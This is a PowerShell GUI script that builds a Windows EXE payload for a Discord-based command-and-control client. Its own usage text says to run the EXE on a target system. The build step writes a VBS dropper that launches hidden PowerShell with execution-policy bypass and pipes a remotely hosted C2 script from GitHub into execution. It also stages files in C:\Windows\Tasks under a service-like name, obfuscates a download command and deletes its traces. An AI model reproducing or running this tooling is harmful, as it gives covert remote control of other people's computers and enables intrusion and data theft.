<#
============================================= Beigeworm's Discord C2 Client Builder GUI ========================================================

SYNOPSIS
This is an easy to use builder application for the c2 client payload - Creates your own EXE file payload for windows systems.

USAGE
Run this script and input the relevant info, then click build and run the exe on a target system. 

#>

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName Microsoft.VisualBasic
[System.Windows.Forms.Application]::EnableVisualStyles()

$MainWindow = New-Object System.Windows.Forms.Form
$MainWindow.ClientSize = '435,300'
$MainWindow.Text = "| BeigeTools | Discord C2 Client Builder |"
$MainWindow.BackColor = "#242424"
$MainWindow.Opacity = 1
$MainWindow.TopMost = $true
$MainWindow.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon("C:\Windows\System32\DevicePairingWizard.exe")

$outputHeader = New-Object System.Windows.Forms.Label
$outputHeader.Text = "Output Path EXE"
$outputHeader.ForeColor = "#bcbcbc"
$outputHeader.AutoSize = $true
$outputHeader.Width = 25
$outputHeader.Height = 10
$outputHeader.Location = New-Object System.Drawing.Point(15, 163)
$outputHeader.Font = 'Microsoft Sans Serif,10,style=Bold'

$outputbox = New-Object System.Windows.Forms.TextBox
$outputbox.Location = New-Object System.Drawing.Point(20, 183)
$outputbox.BackColor = "#eeeeee"
$outputbox.Width = 280
$outputbox.Height = 45
$outputbox.Text = "Build.exe"
$outputbox.Multiline = $false
$outputbox.Font = 'Microsoft Sans Serif,10,style=Bold'

$TextboxInputHeader = New-Object System.Windows.Forms.Label
$TextboxInputHeader.Text = "Discord Webhook"
$TextboxInputHeader.ForeColor = "#bcbcbc"
$TextboxInputHeader.AutoSize = $true
$TextboxInputHeader.Width = 25
$TextboxInputHeader.Height = 10
$TextboxInputHeader.Location = New-Object System.Drawing.Point(15, 15)
$TextboxInputHeader.Font = 'Microsoft Sans Serif,10,style=Bold'

$TextBoxInput = New-Object System.Windows.Forms.TextBox
$TextBoxInput.Location = New-Object System.Drawing.Point(20, 35)
$TextBoxInput.BackColor = "#eeeeee"
$TextBoxInput.Width = 400
$TextBoxInput.Height = 45
$TextBoxInput.Text = ""
$TextBoxInput.Multiline = $False
$TextBoxInput.Font = 'Microsoft Sans Serif,10,style=Bold'

$TextboxInputHeader2 = New-Object System.Windows.Forms.Label
$TextboxInputHeader2.Text = "Pastebin URL"
$TextboxInputHeader2.ForeColor = "#bcbcbc"
$TextboxInputHeader2.AutoSize = $true
$TextboxInputHeader2.Width = 25
$TextboxInputHeader2.Height = 10
$TextboxInputHeader2.Location = New-Object System.Drawing.Point(15, 65)
$TextboxInputHeader2.Font = 'Microsoft Sans Serif,10,style=Bold'

$TextBoxInput2 = New-Object System.Windows.Forms.TextBox
$TextBoxInput2.Location = New-Object System.Drawing.Point(20, 85)
$TextBoxInput2.BackColor = "#eeeeee"
$TextBoxInput2.Width = 400
$TextBoxInput2.Height = 45
$TextBoxInput2.Text = ""
$TextBoxInput2.Multiline = $False
$TextBoxInput2.Font = 'Microsoft Sans Serif,10,style=Bold'

$ParentInputHeader = New-Object System.Windows.Forms.Label
$ParentInputHeader.Text = "Parent Script URL"
$ParentInputHeader.ForeColor = "#bcbcbc"
$ParentInputHeader.AutoSize = $true
$ParentInputHeader.Width = 25
$ParentInputHeader.Height = 10
$ParentInputHeader.Location = New-Object System.Drawing.Point(15, 113)
$ParentInputHeader.Font = 'Microsoft Sans Serif,10,style=Bold'

$ParentInput = New-Object System.Windows.Forms.TextBox
$ParentInput.Location = New-Object System.Drawing.Point(20, 133)
$ParentInput.BackColor = "#eeeeee"
$ParentInput.Width = 400
$ParentInput.Height = 45
$ParentInput.Text = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1"
$ParentInput.Multiline = $False
$ParentInput.Font = 'Microsoft Sans Serif,10,style=Bold'

$StartBuild = New-Object System.Windows.Forms.Button
$StartBuild.Text = "Build"
$StartBuild.Width = 100
$StartBuild.Height = 30
$StartBuild.Location = New-Object System.Drawing.Point(310, 179)
$StartBuild.Font = 'Microsoft Sans Serif,10,style=Bold'
$StartBuild.BackColor = "#eeeeee"

$MainWindow.controls.AddRange(@($TextboxInputHeader, $TextboxInput, $TextboxInputHeader2, $TextboxInput2, $outputHeader, $outputbox, $ParentInputHeader, $ParentInput, $StartBuild))

$ps2exe = "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/ps2exe.ps1"
$tempps2exe = "C:\Windows\Tasks\ps2exe.ps1"
$tempc2client = "C:\Windows\Tasks\dcc2_1.ps1"

$StartBuild.Add_Click({

$TextBox = $TextBoxInput.Text
$TextBox2 = $TextBoxInput2.Text
$outEXE = $outputbox.Text

"`$hookurl = `"$TextBox`"" | Out-File -FilePath $tempc2client -Force
"`$ghurl = `"$TextBox2`"" | Out-File -FilePath $tempc2client -Force -Append
"`$tobat = @`"" | Out-File -FilePath $tempc2client -Append
"Set WshShell = WScript.CreateObject(```"WScript.Shell```")" | Out-File -FilePath $tempc2client -Append
"WScript.Sleep 200" | Out-File -FilePath $tempc2client -Append
"WshShell.Run ```"powershell.exe -NonI -NoP -Ep Bypass -W H -C ```$hookurl='`$hookurl';```$ghurl='`$ghurl'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex```", 0, True" | Out-File -FilePath $tempc2client -Append
"`"@" | Out-File -FilePath $tempc2client -Append

'$pth = "C:\Windows\Tasks\service.vbs";$tobat | Out-File -FilePath $pth -Force ;& $pth;Sleep 5;rm -Path $pth' | Out-File -FilePath $tempc2client -Append

sleep 2
i`wr -Uri $ps2exe -OutFile $tempps2exe
sleep 2
C:\Windows\Tasks\ps2exe.ps1 -inputFile $tempc2client -OutputFile $outEXE -noConsole -noError -noOutput
sleep 5
$ErrorActionPreference = 'SilentlyContinue'
$outEXEtest = Get-Content -Path $outEXE
sleep 1
if($outEXEtest.Length -lt 1){
$Butt = [System.Windows.MessageBoxButton]::OK
$Errors = [System.Windows.MessageBoxImage]::Error
$Asking = 'Build Failed!'
[System.Windows.MessageBox]::Show($Asking, " Error", $Butt, $Errors)
}else{
$Butt = [System.Windows.MessageBoxButton]::OK
$Errors = [System.Windows.MessageBoxImage]::Information
$Asking = 'Build Succeded!'
[System.Windows.MessageBox]::Show($Asking, " Completed", $Butt, $Errors)
}

rm -Path $tempc2client -Force
rm -Path $tempps2exe -Force
})

$MainWindow.ShowDialog()
exit 
